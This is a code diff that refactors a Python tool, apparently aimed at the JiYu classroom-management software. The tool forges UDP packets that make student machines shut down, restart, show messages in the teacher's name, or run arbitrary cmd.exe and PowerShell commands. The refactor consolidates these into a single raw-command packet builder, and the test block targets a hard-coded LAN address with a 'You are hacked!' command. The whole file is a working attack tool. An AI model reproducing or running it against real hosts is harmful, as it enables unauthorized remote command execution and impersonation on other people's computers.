@@ -1,19 +1,19 @@
+# todo:
+
 import logging
 import os
 import socket
 import sys
-import warnings
 from dataclasses import dataclass
-from logging import Logger, StreamHandler, Formatter
-from typing import Tuple, List, TextIO
+from typing import Tuple, List
 
-logger: Logger = logging.getLogger("my_jiyu_killer")
+logger = logging.getLogger("my_jiyu_killer")
 logger.setLevel(logging.DEBUG)
 
-console_handler: StreamHandler[TextIO] = logging.StreamHandler()
+console_handler = logging.StreamHandler()
 console_handler.setLevel(logging.DEBUG)
 
-formatter: Formatter = logging.Formatter(
+formatter = logging.Formatter(
     fmt="[%(asctime)s] [%(funcName)s/%(levelname)s]: %(message)s",
     datefmt="%Y-%m-%d %H:%M:%S"
 )
@@ -96,7 +96,7 @@ class Target:
         self.address = address
 
     @staticmethod
-    def _format_data(content: str) -> List[int]:
+    def _encode_msg(content: str) -> List[int]:
         """
         格式化用于教师端消息的字符串。
         :param content: 原内容
@@ -117,7 +117,7 @@ class Target:
         return formatted_bytes
 
     @staticmethod
-    def _encode_str(s: str) -> bytes:
+    def _encode_cmd(s: str) -> bytes:
         """
         格式化用于执行指令的字符串。
         :param s: 原指令内容
@@ -140,143 +140,76 @@ class Target:
             raise
         except OSError as e:
             logger.error(f"OSError ({type(e).__name__}): {e}")
+        else:
+            logger.debug(f"SEND: {len(packet)} -> {address[0]}:{address[1]}")
 
     def shutdown(self) -> None:
         """
         发送关机指令。
         """
         self._safe_sendto(Payload.SHUTDOWN, self.address)
-        logger.info(f"Send SHUTDOWN packet to {self.address[0]}:{self.address[1]}")
+        logger.info(f"SHUTDOWN -> {self.address[0]}:{self.address[1]}")
 
     def restart(self) -> None:
         """
         发送重启指令。
         """
         self._safe_sendto(Payload.RESTART, self.address)
-        logger.info(f"Send RESTART packet to {self.address[0]}:{self.address[1]}")
+        logger.info(f"RESTART -> {self.address[0]}:{self.address[1]}")
 
     def msg(self, content: str = "") -> None:
         """
         发送教师端消息（即以教师的口吻）。
         :param content: 消息内容
         """
-        content = self._format_data(content)
+        encode_content = self._encode_msg(content)
         packet = bytearray(Payload.MSG)
-        for idx, element in enumerate(content, start=56):
+        for idx, element in enumerate(encode_content, start=56):
             packet[idx] = element
 
         self._safe_sendto(packet, self.address)
-        logger.info(f"Send MSG packet to {self.address[0]}:{self.address[1]} -> {content}")
+        logger.info(f"MSG: {content} -> {self.address[0]}:{self.address[1]}")
 
-    def raw_command(self, command: str) -> None:
-        encode_command = self._encode_str(command)
+    def raw(self, executable: str, args: str) -> None:
+        """
+        编码并发送命令。
+        :param executable: 可执行文件的绝对路径
+        :param args: 完整的命令行参数
+        """
+
+        encoded_executable = self._encode_cmd(executable)
+        encoded_args = self._encode_cmd(args)
+
         packet = bytearray(Payload.CMD)
-        packet.extend(encode_command)
-        packet.extend(b"\x00" * (324 - len(encode_command)))
-        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")
+        packet.extend(encoded_executable)
+        packet.extend(b"\x00" * (512 - len(encoded_executable)))  # 填充路径部分
+        packet.extend(encoded_args)
+        packet.extend(b"\x00" * (324 - len(encoded_args)))  # 填充参数部分
+        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")  # 固定结尾
 
         self._safe_sendto(packet, self.address)
-        logger.debug(f"Send RAW_COMMAND packet to {self.address[0]}:{self.address[1]} -> {command}")
-
-    def new_cmd(self, command: str, arg: str | None = None) -> None:
-        """
-        使目标使用命令提示符 cmd.exe 执行指令。
-        :param command: 指令内容
-        :param arg: 命令行参数
-        """
-        warnings.warn("This function was not tested and it may not work as well as the old one.", FutureWarning)
-
-        cmd_dir = "C:\\WINDOWS\\system32\\cmd.exe"
-
-        if arg:
-            full_command = f"{cmd_dir} {arg} {command}"
-        else:
-            full_command = f"{cmd_dir} {command}"
-
-        self.raw_command(full_command)
-        logger.info(f"Send CMD packet to {self.address[0]}:{self.address[1]} -> {command}")
-
-    def new_powershell(self, command: str, arg: str | None = None) -> None:
-        """
-        使目标使用 Powershell powershell.exe 执行指令。
-        :param command: 指令内容
-        :param arg: 传递给 powershell.exe 的其他命令行参数
-        """
-        warnings.warn("This function was not tested and it may not work as well as the old one.", FutureWarning)
-        powershell_dir = "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
-        if arg:
-            full_command = f"{powershell_dir} {arg} -c \"& {{{command}}}\""
-        else:
-            full_command = f"{powershell_dir} -c \"& {{{command}}}\""
-        self.raw_command(full_command)
-        logger.info(f"Send POWERSHELL packet to {self.address[0]}:{self.address[1]} -> {command}")
+        logger.debug(f"RAW: {executable} {args} -> {self.address[0]}:{self.address[1]}")
 
     def cmd(self, command: str, arg: str | None = None) -> None:
         """
-        使目标使用命令提示符 cmd.exe 执行指令。
-        :param command: 指令内容
-        :param arg: 命令行参数
+        构造命令提示符命令并发送。
+        :param command: 命令
+        :param arg: 传给 cmd.exe 的其他命令行参数（如 /c 使得 cmd.exe 执行后退出）
         """
-        cmd_dir = "C:\\WINDOWS\\system32\\cmd.exe"
+        executable = "C:\\WINDOWS\\system32\\cmd.exe"
+        args = f"{arg} {command}" if arg else f" {command}"
+        self.raw(executable, args)
+        logger.info(f"CMD: {command} {args} -> {self.address[0]}:{self.address[1]}")
 
-        cmd_dir = self._encode_str(cmd_dir)
-        if arg:
-            full_command = self._encode_str(f" {arg} {command}")
-        else:
-            full_command = self._encode_str(f" {command}")
-
-        packet = bytearray(Payload.CMD)
-        packet.extend(cmd_dir)
-        packet.extend(b"\x00" * (512 - len(cmd_dir)))
-
-        packet.extend(full_command)
-        packet.extend(b"\x00" * (324 - len(full_command)))
-
-        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            try:
-                sock.sendto(packet, self.address)
-            except socket.gaierror as e:
-                logger.error(f"socket.gaierror: {e}")
-                raise
-            except OSError as e:
-                logger.error(f"OSError ({type(e).__name__}): {e}")
-        logger.info(f"Send CMD packet to {self.address[0]}:{self.address[1]} -> {command}")
-
-    def powershell(self, command: str, arg: str | None = None
-                   ) -> None:
+    def powershell(self, command: str, arg: str | None = None) -> None:
+        """构造 Powershell 命令并发送。
+        :param command: 命令
+        :param arg: 传递给 powershell.exe 的其他命令行参数（如 -NoExit 使得 powershell.exe 执行后保留界面）
         """
-        使目标使用 Powershell powershell.exe 执行指令。
-        :param command: 指令内容
-        :param arg: 传递给 powershell.exe 的其他命令行参数
-        """
-        powershell_dir = "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
-        powershell_dir = self._encode_str(powershell_dir)
-
-        if arg:
-            full_command = self._encode_str(f" {arg} -c \"& {{{command}}}\"")
-        else:
-            full_command = self._encode_str(f" -c \"& {{{command}}}\"")
-
-        packet = bytearray(Payload.CMD)
-        packet.extend(powershell_dir)
-        packet.extend(b"\x00" * (512 - len(powershell_dir)))
-
-        packet.extend(full_command)
-        packet.extend(b"\x00" * (324 - len(full_command)))
-
-        packet.extend(b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00")
-
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            try:
-                sock.sendto(packet, self.address)
-            except socket.gaierror as e:
-                logger.error(f"socket.gaierror: {e}")
-                raise
-            except OSError as e:
-                logger.error(f"OSError ({type(e).__name__}): {e}")
-        logger.info(f"Send POWERSHELL packet to {self.address[0]}:{self.address[1]} -> {command}")
+        executable = "C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        args = f"{arg} -c \"& {{{command}}}\"" if arg else f" -c \"& {{{command}}}\""
+        self.raw(executable, args)
+        logger.info(f"POWERSHELL: {command} {args} -> {self.address[0]}:{self.address[1]}")
 
 
 def get_localhost() -> str:
@@ -304,4 +237,4 @@ if __name__ == '__main__':
     print("Your IP: ", get_localhost())
     ADDR = ("10.165.43.52", 4705)  # edit this test ip before
     send = Target(ADDR)
-    send.new_powershell("Write-Output You are hacked!", "-NoExit")
+    send.powershell("Write-Output You are hacked!", "-NoExit")
